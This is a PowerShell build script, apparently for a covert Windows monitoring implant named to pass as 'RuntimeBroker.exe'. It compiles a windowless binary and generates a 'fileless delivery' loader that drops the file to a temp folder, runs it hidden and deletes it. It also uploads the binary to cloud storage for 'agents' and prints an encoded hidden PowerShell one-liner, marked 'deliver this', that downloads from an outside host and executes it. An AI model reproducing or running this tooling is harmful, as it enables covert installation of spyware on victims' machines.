powershell -ExecutionPolicy Bypass -File encrypt_config.ps1
if (!$?) { Write-Output "Config encryption failed"; exit 1 }

windres version.rc -O coff -o version.res
if (!$?) { Write-Output "Resource compilation failed"; exit 1 }

$buildVersion = [int][double]::Parse((Get-Date -UFormat %s))
g++ -static -Os -s -mwindows -D NETPEN_VERSION=$buildVersion monitor.cpp version.res -lwinhttp -lcrypt32 -lgdiplus -lole32 -loleaut32 -lstrmiids -luuid -o RuntimeBroker.exe
if (!$?) { Remove-Item -Force version.res -ErrorAction SilentlyContinue; Write-Output "Compilation failed"; exit 1 }

# Remove-Item -Force version.res -ErrorAction SilentlyContinue
# upx --ultra-brute RuntimeBroker.exe

# Generate loader.ps1 (fileless delivery)
$exeBytes = [IO.File]::ReadAllBytes("RuntimeBroker.exe")
$b64 = [Convert]::ToBase64String($exeBytes)
$loader = @"
`$d = "$b64"
`$b = [Convert]::FromBase64String(`$d)
`$p = "`$env:TEMP\RuntimeBroker.exe"
[IO.File]::WriteAllBytes(`$p, `$b)
Start-Process -WindowStyle Hidden `$p
Start-Sleep -Milliseconds 500
Remove-Item `$p -Force
"@
Set-Content -Path "loader.ps1" -Value $loader

# Upload to Supabase Storage + print one-liner
$sbUrl = "https://xdxlfkyywnjrzqblvdzg.supabase.co"
$envConfig = @{}
Get-Content "config.env" | Where-Object { $_ -match '^(\w+)=(.+)' } | ForEach-Object {
    $envConfig[$matches[1]] = $matches[2]
}
$svKey = $envConfig["SUPABASE_SERVICE_KEY"]
$headers = @{ "apikey" = $svKey; "Authorization" = "Bearer $svKey" }
$bucket = "Netpen"
$object = "RuntimeBroker.exe"

# Upload version.txt first (so agents see it before the new exe)
$verHeaders = $headers.Clone()
$verHeaders["Content-Type"] = "text/plain"
$verHeaders["x-upsert"] = "true"
try {
    $verBytes = [System.Text.Encoding]::UTF8.GetBytes($buildVersion.ToString())
    Invoke-RestMethod -Uri "$sbUrl/storage/v1/object/$bucket/version.txt" -Method Put -Headers $verHeaders -Body $verBytes -ErrorAction Stop | Out-Null
    Write-Output "Version $buildVersion uploaded"
} catch {
    Write-Output "WARNING: version.txt upload failed, build continues"
}

# Upload exe to Supabase Storage (one-liner delivery)
$exeData = [IO.File]::ReadAllBytes("RuntimeBroker.exe")
$uploadHeaders = $headers.Clone()
$uploadHeaders["Content-Type"] = "application/octet-stream"
$uploadHeaders["x-upsert"] = "true"
try {
    Invoke-RestMethod -Uri "$sbUrl/storage/v1/object/$bucket/$object" -Method Put -Headers $uploadHeaders -Body $exeData -ErrorAction Stop | Out-Null
    Write-Output "Uploaded to: $sbUrl/storage/v1/object/public/$bucket/$object"
    Write-Output ""
    Write-Output "=== ONE-LINER (deliver this) ==="
    $rawCmd = "`$wc=New-Object Net.WebClient;`$b=`$wc.DownloadData('https://allseeing.netlify.app/a');`$p=`$env:tmp+'\a.exe';[IO.File]::WriteAllBytes(`$p,`$b);start `$p;sleep -m 500;ri `$p -Force"
    $encBytes = [System.Text.Encoding]::Unicode.GetBytes($rawCmd)
    $encCmd = [Convert]::ToBase64String($encBytes)
    Write-Output "powershell -w h -Enc $encCmd"
    Write-Output "=================================="
} catch {
    Write-Output ""
    Write-Output "=== UPLOAD FAILED ==="
    Write-Output "Check the error above"
    Write-Output "====================="
    Write-Output ""
}

Write-Output "Build successful: RuntimeBroker.exe + loader.ps1"
